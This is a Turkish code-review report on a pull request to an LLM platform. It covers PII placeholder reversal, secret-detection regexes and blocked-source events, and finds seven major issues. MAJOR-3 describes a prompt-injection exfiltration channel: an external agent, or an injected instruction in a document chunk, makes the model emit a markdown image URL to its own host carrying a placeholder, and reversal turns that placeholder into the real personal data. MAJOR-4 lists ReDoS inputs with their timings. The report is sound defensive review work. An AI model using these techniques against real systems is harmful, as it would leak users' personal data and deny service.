# 08 tam dilim 1a r1 inceleme raporu (C17 geri çevirme, FOLLOWUP-106/107/147)

- **İstek:** K-08T1-0006 (REVIEW-ISTEK, güvenlik turu ve tam yığın).
- **SHA:** `fb7130d6fda59b2b62fbecf50e47b7ebd1a15bdf` (feat/08-tam-1-ner). merge-base ea0db36 üstüne 6 commit, 24 dosya, +1523/-73.
- **state/ diff:** 0.
- **Kod erişimi:** detached worktree `.worktrees/review-08t1a-r1`.
- **Yığın:** review-08t1a (18290/13290). `--profile test --profile qdrant`; langfuse, mcp-search, mcp-sql ve ticket-desk dahil. Kod fb7130d'den derlendi.
- **Kararlar:** K-08T1-0002 (S1-S9 A, S8 yetki), K-08T1-0004, K-08T1-0005. KARARLAR "Yer tutucu geri çevirme yetkisi".
- **Yöntem:**
  - **Statik:** dört boyut (C17 yetki, C17 akış hizalama, 106/107, 147 ve sözleşmeler/belgeler), ardından tamlık eleştirmeni. Her BLOCKER/MAJOR/MINOR bulgu iki bağımsız doğrulayıcıya çürütmeleri için verildi; aşağıdakilerin hiçbiri çürütülmedi, önem dereceleri doğrulayıcı notlarıyla ayarlandı.
  - **Yığın:** gerçek modüllerle probe (`08-tam-1a-r1-probe.py`, backend konteynerinde) ve test-int iki profilde.
- **İnceleyici ve tarih:** inceleyici, 2026-11-03.

## Karar: **DEGISIKLIK**

BLOCKER 0, MAJOR 7, MINOR 14, NOTE 9.

C17'nin yetki çekirdeği doğru (aşağıda "Doğru olanlar"):
- yalnız koşu sahibi ve facade çağıranı;
- saklanan görünümler geri çevrilmiyor;
- kapsam sunucuda seçiliyor;
- sahte yer tutucu başka kapsamın değerine ulaşamıyor.

Akış hizalayıcı da doğru: 200 bin rastgele bölme ile fuzz edildi, ham parça çıkmıyor, tampon sınırlı. 147 eşdeğer.

Buna karşılık geri çevirmenin **doğruluğu** iki yolda bozuluyor; sahip yanlış kişinin verisini görüyor (MAJOR-1/2). Geri çevirme ayrıca yeni bir dışarı sızdırma kanalı açıyor (MAJOR-3, kullanıcı ya da koordinatör kararı). 106'nın yeni deseni karesel geri izleme yapıyor ve fazla yanlış pozitif veriyor (MAJOR-4/5). 107'de iki eksik var (MAJOR-6/7).

---

## Güvenlik turu (ayrı bölüm)

### MAJOR-1: TTL dolduktan sonra sayaç 1'den başlıyor; eski yer tutucu başka kişinin değerine çözülüyor

- **Konum:** `guardrails/masking.py:64-71` (`_TOKEN_FOR` Lua: `n` sayacı hash'in içinde, TTL ile birlikte siliniyor), `:90-92` (`lookup` TTL'i yenilemiyor), `api/runs.py:273-285`.
- **Probe (yığında, gerçek `RedisTokenStore` ve `detokenize`, TTL 2 s):**
  - Kapsam A'da `ali@example.test` → `<<PII_1>>`; saklanan cevap `Kayıt sahibi <<PII_1>>.`
  - TTL dolduktan sonra geri çevrilmiyor (doğru): `('Kayıt sahibi <<PII_1>>.', ['<<PII_1>>'])`.
  - Aynı kapsamda yeni bir değer (`veli@example.test`) yine `<<PII_1>>` alıyor.
  - Eski cevap artık **`Kayıt sahibi veli@example.test.`** okunuyor.
- **Gerçek senaryo:** Onay ya da soru bekleyen bir koşu `PII_TOKEN_TTL_S`'yi (1800 s) aşıyor, sonra devam ediyor ve yeni metin (araç sonucu, kaynak, kullanıcı cevabı) tokenize ediliyor. Checkpoint'te ve run_events'te duran eski yer tutucular sahibine yeni kişinin değeriyle gösteriliyor.
- **Neden MAJOR:** S9'daki "uydurma yok" şartı ve kişi verisinin doğruluğu bozuluyor. C17 öncesinde bu çakışma zararsızdı, çünkü geri çevirme yoktu; bu PR onu görünür yapıyor.
- **Öneri:**
  - Sayaç ayrı ve uzun ömürlü bir anahtarda tutulmalı ya da yer tutucuya kapsam nesli eklenmeli.
  - Süresi dolmuş kapsam "expired" işaretlenmeli ve yeni tokenize yeni nesille yapılmalı.
  - `lookup` TTL'i yenilemeli.
  - Bir test eklenmeli (probe'daki senaryo).

### MAJOR-2: konuşma geçmişindeki önceki koşunun yer tutucuları yeni koşunun kapsamında çözülüyor

- **Konum:** `runtime/runner.py:302-310` (assistant `Message.content` = tokenize çıktı), `runtime/adapters.py:561-570` (`_history`), `graph.py:255-260`, `api/runs.py:281` (scope = yeni run). Aynı durum facade agent `X-Conversation-Id` yolunda da var (`facade_agent.py:131-150`).
- **Probe (yığında):**
  - Kapsam A'da `ayse@example.test` → `<<PII_1>>`, kapsam B'de `fatma@example.test` → `<<PII_1>>`.
  - A'nın geçmiş metni `Önceki cevap: <<PII_1>>` B'nin kapsamında **`Önceki cevap: fatma@example.test`** oluyor.
- **Gerçek senaryo:** Model, geçmişteki yer tutucuyu B'nin cevabında tekrar ediyor; bu olağan bir durum. Sahip, B'de aynı numaraya düşen başka bir kişinin değerini görüyor.
- **Yetki sınırı korunuyor:** değer yine sahibinin kendi koşusundan geliyor. Ama yanlış kişiye bağlanıyor.
- **Uçtan uca (iki turlu konuşma) koşulmadı.** fake-llm'de yer tutucuyu yankılayan bir senaryo yok; mekanizma gerçek modüllerle kanıtlandı.
- **Öneri (C17 biçimi additive genişleyebilir):**
  - geçmiş yazılırken A kapsamında açılıp B'de yeniden tokenize edilsin, ya da
  - yer tutucu kapsam/nesil kimliği taşısın, ya da
  - geçmişteki yer tutucular B'de çözülmesin.

### MAJOR-3: çıkışta geri çevirme yeni bir dışarı sızdırma kanalı açıyor (karar gerekiyor)

- **Konum:** `services/facade_external.py:392-395`, `facade_proxy.py:278, 306, 359-379, 463`, `facade_agent.py:432-446`.
- **Mekanizma:**
  - Dış agent ve LLMaaS sağlayıcısı, egress'in değeri sakladığı tarafın kendisi. İsteğin girdisinde `<<PII_1..n>>`'i görüyorlar; numaralar sıralı ve tahmin edilebilir.
  - Bu taraf, prompt injection olmadan bile, cevabına `![x](https://kendi-hostu/?q=<<PII_1>>)` yazabilir. Dolaylı injection ile de olur: bir belge parçasındaki ya da araç sonucundaki talimat bunu modele yazdırabilir.
  - `guard.reveal` URL'nin içine gerçek değeri koyuyor. Markdown görsellerini otomatik yükleyen bir istemci (PayCore'un Open WebUI'si) değeri tarayıcıdan o hosta gönderiyor.
  - C17 öncesinde bu yoldan yalnız yer tutucu sızardı; dış agent cevabı geri çevrilmiyordu (test_06b2_11).
- **Kanıt:** kod okuması. `detokenize` metnin bağlamına bakmıyor (`masking.py:165-182`); URL içindeki yer tutucu da çözülüyor. Uçtan uca koşulmadı: fake-llm yer tutucu yankılamıyor ve gerçek istemci yok.
- **PR notu:** "kendi isteğinin yer tutucusunu yankılayan upstream, değeri aynı çağırana geri getirir" diyor, ama bunu bir tehdit modeli olarak ele almıyor.
- **Seçenekler (koordinatör ya da kullanıcı; C17 kapsamı):**
  - **A (önerilen):** URL ve markdown bağlantı/görsel bağlamındaki yer tutucu geri çevrilmez (`](…)`, `<a href`, çıplak `http(s)://…` içinde). Additive ve testli. Kullanıcı metindeki değeri görmeye devam eder.
  - **B:** Dış agent ve doğrudan model (facade düz) yolunda geri çevirme kapalı olur; yalnız platformun kendi agent yolunda açık kalır. Daha güvenli, ama C17'nin facade düz kullanım durumu kalkar.
  - **C:** Olduğu gibi kalır; risk PR notu ve runbook'ta kabul edilmiş kısıt olarak yazılır, FOLLOWUP açılır.

### MAJOR-4: 106 deseni karesel geri izleme yapıyor (ReDoS)

- **Konum:** `guardrails/rules.py:57-65` `_SHORT_TOKEN`: `\b(word)\b["']?\s*(?:[:=]|\bis\b)?\s*["']?`. İki `\s*`'ı opsiyonel bir grup ayırıyor; değer eşleşmeyince n boşluk iki `\s*` arasında O(n²) biçimde bölüştürülüyor.
- **Probe (yığında, gerçek `rules.find_secrets`):**

  | Girdi | Süre |
  |---|---|
  | `token` + 5.000 boşluk + `!` | **3,19 s** |
  | `token` + 10.000 boşluk + `!` | **13,2 s** |
  | `token` + 20.000 boşluk + `!` | **43,1 s** |
  | `('token' + 3000 boşluk + 'x ') × 60` (180 bin karakter, `MAX_TEXT_CHARS` 200 bin altında) | **58,8 s** |
  | Karşılaştırma: mevcut `_ASSIGNMENT` (`password` + 10.000) | 3,2 s |

  Mevcut desen de karesel; bu PR'dan önce de vardı, ama yaklaşık 4 kat daha hızlı.
- **Saldırı yüzeyi:** girdi kullanıcı sorusu (input.pre), belge parçası (egress, artık parça başına), araç sonucu ya da model cevabı olabilir.
- **Doğrulanmadı:** olay döngüsünün etkilenip etkilenmediği. `to_thread` içinde çalışıyor ama `re` GIL'i bırakmıyor.
- **Öneri:** Doğrusal eşdeğeri `…\b["']?(?:\s*(?:[:=]|\bis\b))?\s*["']?…`. Doğrulayıcının scratch ölçümü: 200 bin boşlukta 0,05 s ve 3.000 örnekte span farkı 0. Aynı düzeltme `_ASSIGNMENT`'a da uygulanmalı; o kısım bu PR'dan önce de vardı, aynı commit'te ya da FOLLOWUP olarak yapılabilir. Bir zaman sınırı testi eklenmeli.

### MAJOR-5: 106 yanlış pozitifleri (secrets `block`)

- **Probe (yığında):**

  | Metin | Bulgu |
  |---|---|
  | `token = getAccessToken() neden null?` | `API_TOKEN getAccessToken` |
  | `anahtar TeslimProjeleri kapsamında` ("anahtar teslim" yaygın bir Türkçe deyim) | `TeslimProjeleri` |
  | `token: INC0012345678` (bilet kimliği) | `API_TOKEN` |
  | `secret = loadSecretValue(x)` | `API_TOKEN` |
  | `Authorization: BearerTokenRequired` | `API_TOKEN` |

- **Etkisi:**
  - `secrets` kuralı `action=block` ve input.pre/tool.post/output.pre/egress aşamalarında çalışıyor (`builtin.py:33`).
  - Enforce politikalı bir projede kod ya da teknik içerik barındıran soru, belge parçası ve cevap bloklanıyor. Fail-loud olduğu için sessiz değil ama gürültülü.
  - PR'daki 08 r3 ölçümü (yakalama oranı) yeniden üretildi; yanlış pozitif ölçümü yok.
- **Öneri:**
  - `anahtar` yalnız bileşik bağlamda sayılsın ("erişim/API/gizli anahtar(ı)").
  - Tek segmentli CamelCase ve sözcük + rakam değerleri için muafiyet eklensin.
  - Yanlış pozitif testleri bu örneklerle eklensin.

### MAJOR-6 (107): hepsi engellenince `sources` olayı yazılmıyor; F11 e2e'nin `failed` dalı ölü

- **Konum:** `runtime/graph.py:118, 217-223`. `_egress_sources` tümü engellenince `StopRun`'ı `ctx.events.record(sources)`'dan (`:124`) önce fırlatıyor.
- **Sonuç:**
  1. Kabul kriteri "sources olayı engelleneni blocked ile işaretler" tümü engellendiğinde tutmuyor; hangi parçanın düştüğü olayda görünmüyor.
  2. `tests/e2e/scenarios/test_18_f11_f13_content.py:64`'teki `(sources,) = [...]` boş listede `ValueError` veriyor; `:71-72`'deki `failed guardrail_block` dalına ulaşılamıyor.
  3. PR'ın "test her iki sonucu da kabul eder" iddiası doğru değil.
- **Risk gerçek:** P5 belgesi tek parça ve "48 saat" cevabı ile blob aynı parçada.
- **Doğrulama:** iki doğrulayıcı, kod okuması. F11 e2e bu turda da NOT_RUN.
- **Öneri:** `StopRun`'dan önce `sources` olayı (`selected=[]`, `blocked=[…]`) yazılsın; e2e testi ve `test_08t_12b` bunu doğrulasın.

### MAJOR-7 (107 × FOLLOWUP-108): yeni `blocked` listesine silinmiş belge maskesi uygulanmıyor

- **Konum:** `api/runs.py:176` `_SOURCE_LISTS = ("selected", "sources")`. `graph.py:208-211` her blocked girdisine `source.public()` alanlarını koyuyor (`document_id`, `document_name`, `breadcrumb`).
- **Sonuç:** Belge sonradan silinse de blocked girdisindeki `breadcrumb` ve `document_name` maskelenmiyor. Bu, `GET /runs/{id}/events`, replay ve canlı akış için geçerli. `docs/agentlar.md:111`'deki "every read shows its breadcrumb as [deleted]" sözü bozuluyor.
- **Doğrulama:** iki doğrulayıcı, kod okuması. Yığında koşulmadı.
- **Öneri:** `_SOURCE_LISTS`'e `"blocked"` eklensin ve bir test yazılsın (silinmiş belge + blocked kaynak → `[deleted]`).

### Güvenlik turunda doğru olanlar

| Konu | Durum |
|---|---|
| Geri çevirme yetkisi (S8) | `is_run_owner` = `str(run.user_id) == actor_id` (`runs.py:231-235`). create_run, stream_run ve resume_run `exit_mode(actor.actor_id)` kullanıyor. Onaylayıcı, analist, admin, superadmin, servis jetonu ve impersonate etmeyen API anahtarı sahip sayılmıyor. |
| Saklanan görünümler | `GET /runs/{id}`, `/events` ve onaylar geri çevrilmiyor; `detokenize` çağrıları yalnız `_stream` ve facade çıkışlarında. |
| Kapsam | Sunucuda seçiliyor: run id ya da `facade-<uuid4>`. Hiçbir parametre scope almıyor. Sahte yer tutucu yalnız kendi kapsamında aranıyor, bulunamazsa kalıyor. |
| Kalıcılık | Audit, tracing ve `gate.commit` reveal'dan önce. Loglarda yalnız `scope` ve `count` var. Çalışma zamanında Langfuse ve DB taraması yapılmadı. |
| Enforce `pii` çıkışı | Geri çevirme yok, `detokenize_skipped_policy` logu var; test_06b_4 değişmedi. |
| Hizalayıcı | En çok 15 karakter tutuyor. Tamamlanmayan `<<`/`<<PII_x` düşmüyor. Çok baytlı karakter sorunu yok. Last-Event-ID kimlikleri tutarlı. Doğrulayıcı 200 bin rastgele bölme ile fuzz etti. |
| 147 | `check_base_url` ea0db36 ile satır satır eşdeğer. Hata kodları ve sıra aynı. `RESERVED_HOSTS` ve `_host` normalleştirmesi değişmedi. 06b-2 SSRF probe'u bu SHA'da iki profilde yeşil (138/138). |
| 107 | Engellenen parça LLM'e ulaşmıyor: state, `user_message`, `search_documents` tool sonucu ve egress cache yolları kapalı. `blocked` girdisinde `text` yok. Airgap'te davranış aynı. |
| Airgap | Profil dalı yok. Yerleşik tokenize yalnız egress'te; egress kapalıyken yer tutucu üretilmiyor. |

### NOTE (güvenlik)

- **NOTE-1:** Impersonation (servis `X-On-Behalf-Of` ya da impersonate kapsamlı anahtar) sahip sayılıyor ve değerleri alıyor. KARARLAR'la uyumlu; audit'te kimin gördüğü ayırt edilmiyor.
- **NOTE-2:** Başarılı geri çevirme için bir audit olayı yok (bilgi).
- **NOTE-3:** "Postgres tokenize kalır" iddiası ham girdi için geçerli değil (`Run.input`). Bu PR'dan önce de böyleydi.

## MINOR'lar

1. **Akış hatası ya da iptali:** hizalayıcıda tutulan en çok 15 karakterlik kuyruk istemciye gitmiyor (`facade_proxy.py:429-453, 473-477`; `graph.py:311-321`). Görünür metin kaybı küçük ama sessiz.
2. **finish_reason gelmeyen akış:** `rest` chunk'ı usage chunk'ından sonra ve `finish_reason` olmadan gidiyor (`facade_proxy.py:452-453`).
3. **Araç argümanları:** geri çevrilen değer JSON kaçışı yapılmadan ekleniyor (`facade_proxy.py:303-306, 375-377`). İçinde `"` olan bir değer argüman JSON'unu bozar.
4. **Politika okuma anında çözülüyor:** koşu sırasında enforce olan `pii` kuralı sonradan monitor'a alınırsa saklanan cevap sahibine açılır, ya da tersi olur (`runs.py:238-244`, `facade_agent.py:431-433`).
5. **Açık SSE bağlantısı:** üyelik ya da rol değişikliğini görmüyor (`runs.py:355-372`). Yeniden bağlanmada reddediliyor.
6. **Canlı facade akışında** unresolved/skipped sayıları iki kez loglanıyor (`facade_proxy.py:452-460`, `facade_guard.py:125-134`).
7. **S8 uç nokta ve rol düzeyinde sınanmıyor:** `test_08t_c17_exit.py:84-104` `exit_mode`'u fonksiyon düzeyinde çağırıyor; `resume_run` hiçbir testte geçmiyor.
8. **Dış agent ve facade agent yolunda geri çevirmenin olumlu durumu testsiz:** `test_06b2_11` PII'siz ('x'); `facade_agent._events` testte çağrılmıyor. PR tablosundaki kanıt iddiası eksik.
9. **Enforce politikada C17 fiilen kapalı:** yerleşik politikanın çıkış `pii redact` kuralı enforce edilince `masks_pii_at` true dönüyor; geri çevirme yalnız monitor politikada çalışıyor. K-08T1-0004 (2) ile tutarlı, ama sonucu (seed hedef projede C17 hiç çalışmıyor) belgede açık değil.
10. **`masks_pii_at`** kuralın aksiyonuna (log/warn) ve kategorisine bakmıyor (`engine.py:120-123`); hiçbir şey gizlemeyen bir kural da geri çevirmeyi kapatıyor. Yön güvenli, gerekçe docstring'le uyuşmuyor.
11. **Okuma tarafında Redis hatası** (HGET istisnası) SSE akışını olay göndermeden koparıyor (`events.py:205-207`). DB replay artık Redis'e bağımlı.
12. **Belgelerde kuyruk uzunluğu tutarsız:** `docs/api.md:476-477` "16" diyor; `docs/guardrail.md:135` ve kod 15.
13. **106 yanlış negatifleri (probe):** `auth_token: QWERTYUIOPASDF` ve `DB_TOKEN=Xk9QpLmZ2vRt8` yakalanmıyor (`\b` ve `_` önek), ayrıca boşluklu `api key`. Negatif birim testlerinin yarısı muafiyete hiç ulaşmıyor (`test_08t_secrets_short.py:69-83`).
14. **107:** kaynak numarası çakışması (`search_documents` başlangıcı kept sayısından hesaplanıyor; `graph.py:552-555, 610, 641-643`). F11 5b sızıntı iddiası blob/kanarya yerine bütün injection satırıyla sınanıyor (`test_18_f11_f13_content.py:67-68`).

## NOTE'lar (güvenlik dışı)

- **NOTE-4:** 9 ve üzeri haneli yer tutucu hizalanmıyor (`\d{1,8}`). Pratikte ulaşılmaz.
- **NOTE-5:** Tümü engellenen `search_documents` bütün koşuyu düşürüyor. Bütçe engellemeden önce uygulanıyor; boşalan yer doldurulmuyor.
- **NOTE-6:** Parça başına egress, guardrail olaylarını parça sayısı kadar çoğaltıyor; gecikme ölçülmedi.
- **NOTE-7:** Engellenen kaynak konsol arayüzünde gösterilmiyor (`frontend/`'de `blocked` yok).
- **NOTE-8:** `check_http_destination` genel bir yardımcı ama userinfo, query ve rezerve host reddi yok. Docstring webhook'u olası çağıran olarak anıyor; o yol için 06b-2 kuralları ayrıca gerekir (FOLLOWUP-159 ile ilişkili).
- **NOTE-9:** C9 additive: yalnız `blocked` eklendi, olay ve alan silinmedi. C11 `x_platform` aynı. C8 değişmedi. OpenAPI ve contract dosyaları diff'te yok. Ön yüz tipinin fazladan alanı kabul ettiği doğrulanmadı.

## Belgeler

- docs/guardrail.md, docs/agentlar.md ve docs/api.md'deki log adları, "kim neyi görür" ve kısa token sözcük listesi kodla birebir.
- İstisnalar: MINOR-12 (16 ile 15) ve MAJOR-7 (`[deleted]` sözü blocked için tutmuyor).

## Koşular

| Koşu | Sonuç | Kanıt |
|---|---|---|
| SHA doğrulama | commit; 6 commit; state/ 0 | — |
| Yığın up (fb7130d derlemesi, tam profil) | healthy | `08t1a-r1-stack-up.log` |
| Probe: ReDoS, 106 yanlış pozitif/negatif, TTL çakışması, kapsam çakışması | yukarıda | `08t1a-r1-probe.log` |
| `make test` llmaas ve airgap | **1010/1010** llmaas, **1010/1010** airgap | `08t1a-r1-unit-{llmaas,airgap}.log` |
| `make test-int` llmaas ve airgap (tam yığın, `RUN_QDRANT_TESTS=1`) | llmaas **809 passed, 5 skipped**; airgap **807 passed, 7 skipped**; kırmızı yok. İşçinin yalın yığındaki ortam kırmızıları (02, 05a-live, 18td) tam yığında geçti. | `08t1a-r1-int-{llmaas,airgap}.log` |
| 06b-2 SSRF probe (r2 probe'u, bu SHA'da) | r2 probe'um, test_06b2_external_agent, test_06b2_external ve test_08t_egress_http: **138 passed** llmaas, **138 passed** airgap. SSRF matrisi (31 URL, 20 rezerve, redirect, DNS rebinding) değişmedi. | `08t1a-r1-06b2-probe-{llmaas,airgap}.log` |

**NOT_RUN:**
- F11 e2e (test rolü, K-08T1-0005).
- MAJOR-2'nin iki turlu uçtan uca testi ve MAJOR-3'ün gerçek istemciyle denenmesi (fake-llm yankılamıyor).
- MAJOR-6 ve MAJOR-7 yığında (kod okuması ve iki doğrulayıcı).
- Langfuse ve DB'de değer taraması.
- Olay döngüsü engelleme ölçümü (MAJOR-4).
- Lint.

## İstenen düzeltmeler

1. **MAJOR-1:** kapsam nesli ya da kalıcı sayaç, `lookup` TTL yenilemesi ve bir test.
2. **MAJOR-2:** geçmişteki yer tutucuların kapsam dışı çözülmemesi ve bir test.
3. **MAJOR-3:** koordinatör veya kullanıcı kararı (A/B/C); seçilen yolun testi.
4. **MAJOR-4:** doğrusal desen (ve `_ASSIGNMENT`) ile zaman sınırı testi.
5. **MAJOR-5:** `anahtar` bağlamı, CamelCase muafiyeti ve yanlış pozitif testleri.
6. **MAJOR-6:** `StopRun` öncesinde `sources` olayı; e2e ve `test_08t_12b` düzeltmesi.
7. **MAJOR-7:** `_SOURCE_LISTS`'e `blocked` ve bir test.
8. MINOR 1-3, 7, 8, 11 ve 12 bu turda önerilir. Kalan MINOR ve NOTE'lar FOLLOWUP ya da PR notu olabilir.
